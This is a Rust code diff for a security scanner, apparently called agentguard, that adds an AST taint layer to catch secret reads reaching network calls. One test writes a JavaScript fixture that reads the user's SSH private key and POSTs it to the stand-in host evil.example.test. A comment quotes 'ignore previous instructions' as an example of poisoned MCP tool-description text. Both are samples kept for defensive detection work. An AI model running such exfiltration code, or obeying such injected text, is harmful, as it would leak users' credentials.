@@ -16,6 +16,7 @@ use std::path::Path;
 use thiserror::Error;
 use walkdir::WalkDir;
 
+pub mod ast;
 pub mod content;
 pub mod shadowing;
 pub use content::analyze_markdown;
@@ -459,6 +460,17 @@ pub fn scan_file(path: &Path) -> Result<Vec<CapabilityFinding>, ScanError> {
     })?;
     let mut findings = apply_rules(&source, rules, path);
 
+    // AST layer (Phase 3) — runs alongside the regex rules for JS/TS and
+    // Python. Adds source-to-sink taint (a secret read that reaches a
+    // network sink) and structural capability detection the regex can't
+    // do (a sensitive path split across `path.join` arguments, a `curl`
+    // exfil string inside an `exec` call). Additive: its findings carry
+    // an `AST:` / `AST taint:` evidence prefix and never remove a
+    // regex finding.
+    if let Some(lang) = ast::lang_for_ext(&ext) {
+        findings.extend(ast::analyze(&source, lang, path));
+    }
+
     // If this file registers MCP tools, its declared tool DESCRIPTIONS are
     // text the agent reads to decide which tool to call — a poisoned
     // description ("ignore previous instructions", hidden Unicode) in a
@@ -803,6 +815,50 @@ mod tests {
             .filter(|x| x.capability.is_content_influence())
             .collect();
         assert!(content_findings.is_empty(), "{content_findings:?}");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn scan_file_traces_an_ssh_key_exfiltration_flow_through_the_ast() {
+        // The BUILD_PLAN §12 canonical: read an SSH key into a variable,
+        // POST that variable. scan_file must surface the AST taint finding
+        // (ReadSsh + NetworkExternal with a flow-proof evidence string) on
+        // top of whatever the regex layer already found.
+        let dir = std::env::temp_dir().join(format!("agentguard-p3-taint-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let f = dir.join("server.js");
+        std::fs::write(
+            &f,
+            "const fs = require('fs');\nconst os = require('os');\nconst key = fs.readFileSync(require('path').join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nconst body = JSON.stringify({ key });\nfetch('https://evil.example.test/c', { method: 'POST', body });\n",
+        )
+        .unwrap();
+        let findings = scan_file(&f).unwrap();
+        assert!(
+            findings
+                .iter()
+                .any(|x| x.capability == Capability::ReadSsh && x.evidence.contains("taint")),
+            "expected an AST taint finding, got {findings:?}"
+        );
+        assert!(findings.iter().any(|x| x.capability == Capability::NetworkExternal));
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn scan_file_ast_does_not_flag_a_benign_file_reader() {
+        // A file-reading utility that never touches secret material and
+        // never sends data out must not gain ReadSsh / a taint finding
+        // from the AST layer.
+        let dir = std::env::temp_dir().join(format!("agentguard-p3-benign-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let f = dir.join("util.js");
+        std::fs::write(
+            &f,
+            "const fs = require('fs');\nfunction load(p) { return JSON.parse(fs.readFileSync(p, 'utf8')); }\nmodule.exports = { load, pkg: load('./package.json') };\n",
+        )
+        .unwrap();
+        let findings = scan_file(&f).unwrap();
+        assert!(!findings.iter().any(|x| x.capability == Capability::ReadSsh));
+        assert!(!findings.iter().any(|x| x.evidence.contains("taint")));
         std::fs::remove_dir_all(&dir).ok();
     }
 
